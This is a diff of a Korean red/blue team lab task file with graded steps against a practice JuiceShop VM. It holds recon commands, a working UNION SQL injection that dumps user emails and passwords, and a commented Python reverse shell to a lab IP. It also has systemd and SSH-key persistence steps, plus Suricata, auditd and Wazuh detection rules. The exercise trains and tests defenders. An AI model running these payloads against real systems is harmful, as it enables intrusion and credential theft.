@@ -36,20 +36,22 @@ steps:
     type: output_contains
     expect: open
     semantic:
-      intent: '[RED] 다단계 침투 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] 다단계 침투 Recon — nmap -sV -sC --top-ports 1000 + dirb / gobuster 로 상위 1000 포트 서비스 버전
+        + 숨겨진 웹 경로(/admin /api /backup /uploads) 탐색. w1 의 APT Recon 보다 더 깊은 활성 정찰. 초기 접근 벡터 다수 후보 확보'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - nmap --top-ports 1000 -sV -sC
+      - dirb/gobuster 로 웹 경로 열거
+      - 활성 정찰 (passive 아님)
+      - 다수 후보 벡터 확보 개념
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - nmap --top-ports 1000 + dirb/gobuster
+      - nmap --script default,vuln
+      - wfuzz / ffuf 로 더 빠른 퍼징
+      - shodan + 활성 정찰 조합
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 단일 포트 스캔
+      - 웹 경로 열거 누락
+      - 정찰 깊이 부족
   target_vm: attacker
   script: nmap -sV --top-ports 1000 --max-retries 1 --host-timeout 15s -T4 -oN /tmp/multi_stage_recon.txt
     10.20.30.80 && dirb http://10.20.30.80 /usr/share/dirb/wordlists/common.txt 2>&1 | tail -15
@@ -70,20 +72,20 @@ steps:
     type: output_contains
     expect: email
     semantic:
-      intent: '[RED] 다단계 침투 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] JuiceShop UNION SQLi 사용자 목록 추출 — /rest/products/search?q=test''))%20UNION%20SELECT%20id,email,password,role,null,null,null,null,null%20FROM%20Users--
+        로 Users 테이블의 id/email/password/role 전체 레코드 탈취. 기본 SQLi(OR 1=1) 와 달리 UNION 으로 특정 컬럼 타겟팅'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - UNION SELECT FROM Users 페이로드
+      - email/password/role 등 특정 컬럼 추출
+      - 응답에 사용자 데이터 포함
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - UNION SELECT email, password FROM Users 변형
+      - sqlmap -u <url> --dump -T Users
+      - 정확한 컬럼 수 일치 유지
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - OR 1=1 단순 우회 (UNION 아님)
+      - 특정 컬럼 미지정
+      - 사용자 목록 누락
   target_vm: attacker
   script: curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION%20SELECT%20id,email,password,role,'5','6','7','8','9'%20FROM%20Users--"
     | python3 -m json.tool | head -30
@@ -106,20 +108,23 @@ steps:
     type: output_contains
     expect: simulation
     semantic:
-      intent: '[RED] 다단계 침투 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] Python 리버스 쉘 코드 구조 시뮬레이션 — cat > /tmp/reverse_shell.py << EOF import socket,subprocess,os;
+        s=socket.socket(); s.connect((LHOST,LPORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); subprocess.call([/bin/sh]).
+        실제 연결 대신 코드 구조만 확인 (교육 목적). MITRE T1059.006 Python'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - python reverse shell 코드 파일 생성
+      - socket + dup2 + subprocess 구조
+      - 실제 연결 없는 시뮬레이션
+      - T1059.006 매핑
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file.py << EOF + 코드
+      - msfvenom python reverse_tcp 생성
+      - pwncat-cs 대체
+      - Python file read 만
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 실제 연결 시도
+      - 코드 구조 설명 없음
+      - MITRE 매핑 없음
   target_vm: attacker
   script: 'cat > /tmp/reverse_shell_sim.py << ''PYEOF'' import socket,subprocess,os # SIMULATION ONLY
     - DO NOT EXECUTE # s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # s.connect(("10.20.30.201",4444))
@@ -147,20 +152,22 @@ steps:
     type: output_contains
     expect: multi-user.target
     semantic:
-      intent: '[RED] 다단계 침투 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] Persistence systemd + SSH 키 — systemd unit 파일(/tmp/sim.service [Unit]/[Service]/[Install])
+        구조 + ssh-keygen 공개키를 authorized_keys 추가. 2가지 지속성 기법 동시 시뮬레이션. systemctl enable 로 부팅 시 자동 실행. MITRE
+        T1543.002 Systemd Service + T1098.004 SSH Keys'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - systemd unit 파일 생성 (ExecStart 등)
+      - ssh-keygen + authorized_keys 삽입
+      - T1543.002 + T1098.004 매핑
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > /tmp/x.service << EOF
+      - ssh-keygen + cat >> authorized_keys
+      - ~/.config/systemd/user/ user service
+      - crontab + service 2중 백업
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 1종만 시뮬레이션
+      - systemctl enable 없음 (등록 안 됨)
+      - MITRE 매핑 없음
   target_vm: attacker
   script: cat > /tmp/persistence_service_sim.service << 'EOF' [Unit] Description=System Health Monitor
     After=network.target [Service] Type=simple ExecStart=/bin/bash -c "echo PERSISTENCE_SERVICE_ACTIVE
@@ -188,20 +195,22 @@ steps:
     type: output_contains
     expect: persistence
     semantic:
-      intent: '[BLUE] 다단계 침투 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] auditd 규칙 — -w /etc/passwd -p wa -k passwd_watch + -w /etc/shadow -p wa -k shadow_watch
+        + -w /root/.ssh -p rwa -k ssh_access + -w /etc/cron.d -p wa -k cron_watch. /etc/audit/rules.d/50-suspect.rules
+        배포 후 auditctl -R. 4종 크리티컬 경로 변경 이벤트 실시간 로깅'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - auditctl -w 또는 rules.d 파일 생성
+      - /etc/passwd·shadow·.ssh·cron.d 4대 경로 감시
+      - -p wa (write+attribute) 옵션
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - auditctl -w <path> -p wa -k <key>
+      - /etc/audit/rules.d/ 설정
+      - ausearch -k <key> 로 이벤트 조회
+      - Wazuh FIM 통합 대체
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - auditd 없이 inotify 만
+      - 감시 경로 3개 이하
+      - key 없어 조회 어려움
   target_vm: secu
   script: cat > /tmp/audit_persistence_rules.conf << 'EOF' -w /etc/passwd -p wa -k persistence_account
     -w /etc/shadow -p wa -k persistence_account -w /etc/crontab -p wa -k persistence_cron -w /var/spool/cron/
@@ -229,20 +238,22 @@ steps:
     type: output_contains
     expect: UNION SELECT
     semantic:
-      intent: '[BLUE] 다단계 침투 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] Suricata SQLi + 리버스 쉘 룰 — alert http (content:UNION nocase; content:SELECT) + alert
+        tcp (outbound 비표준 포트 연결 + reverse shell 시그니처 /bin/sh|sh -i|bash -i). 웹 공격 + 반출 채널 양방향 커버. threshold
+        로 오탐 최소화'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - HTTP SQLi 룰 + TCP 리버스 쉘 룰
+      - /etc/suricata/rules/local.rules 저장
+      - reverse shell 시그니처 패턴
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - alert http + content UNION SELECT
+      - alert tcp + content /bin/sh|bash -i
+      - ET Open Reverse Shell 룰 활용
+      - pcre 로 정교한 매칭
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - SQLi 또는 reverse shell 한쪽만
+      - sid 없음
+      - flow 방향 제한 없음
   target_vm: secu
   script: cat > /tmp/custom_detection.rules << 'EOF' alert http any any -> 10.20.30.0/24 any (msg:"SQLI
     Attempt - UNION SELECT"; flow:to_server,established; content:"UNION"; nocase; content:"SELECT"; nocase;
@@ -271,20 +282,22 @@ steps:
     type: output_contains
     expect: multistage_attack
     semantic:
-      intent: '[BLUE] 다단계 침투 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] Wazuh 다단계 침투 correlation — frequency=3 + timeframe=300 + if_matched_sid 로 5분 내 3개
+        이상 Persistence 관련 이벤트(systemd service 생성·SSH key 추가·cron 등록·useradd) 조합 시 고위험 경보. /var/ossec/etc/rules/local_rules.xml
+        에 추가. 다단계 지속성 시도의 burst 패턴 탐지'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - local_rules.xml frequency+timeframe 룰
+      - Persistence 관련 3개 이상 이벤트 조합
+      - 5분 burst 패턴 탐지 개념
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - Wazuh composite rule (if_matched_sid)
+      - Elastic correlation (kibana)
+      - Splunk transaction 명령
+      - Sigma rule
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 단일 이벤트 룰만
+      - correlation 아닌 threshold
+      - Persistence 특화 아님
   target_vm: siem
   script: "cat > /tmp/wazuh_multistage_rule.xml << 'EOF'\n<group name=\"multistage_attack\">\n  <rule\
     \ id=\"100110\" level=\"12\" frequency=\"3\" timeframe=\"300\">\n    <if_matched_group>persistence_detection</if_matched_group>\n\
@@ -319,20 +332,22 @@ steps:
     type: output_contains
     expect: Multi-Stage Intrusion Report
     semantic:
-      intent: '[RED/BLUE] 다단계 침투 통합 — Phase 전환 또는 종합 보고서·환경 정리'
+      intent: '[RED/BLUE] 방어 매트릭스 + 침투 타임라인 /tmp/pentest_report.txt — Red Kill Chain 각 단계 실행 시각 + Blue
+        탐지·대응 이벤트 시각 + 탐지 gap 분석 + Defense-in-Depth 매트릭스 (Network/Host/App/Data 4계층 × 현재 적용 컨트롤). 양방향
+        정리된 종합 문서. 환경 정리(crontab -r, rm systemd service) 포함'
       success_criteria:
-      - RED/BLUE 양쪽 산출물 모두 포함 또는 정리
-      - 보고서 파일 저장 또는 markdown 출력
-      - MITRE ATT&CK 매핑 + 개선 권고
+      - /tmp/pentest_report.txt 보고서
+      - 타임라인 (Red 공격 시각 + Blue 탐지 시각)
+      - 4계층 방어 매트릭스
+      - 환경 정리 (service/cron 제거)
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file + 타임라인 표
+      - timesketch 로 타임라인 도구화
+      - MITRE ATT&CK Navigator coverage
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 타임라인 없음
+      - 방어 매트릭스 없음
+      - 정리 누락
   target_vm: attacker
   script: "rm -f /tmp/reverse_shell_sim.py /tmp/persistence_service_sim.service /tmp/apt_key_sim* 2>/dev/null\
     \ && cat > /tmp/pentest_report_week02.txt << 'EOF'\n=== Multi-Stage Intrusion Report ===\nDate: 2026-04-06\
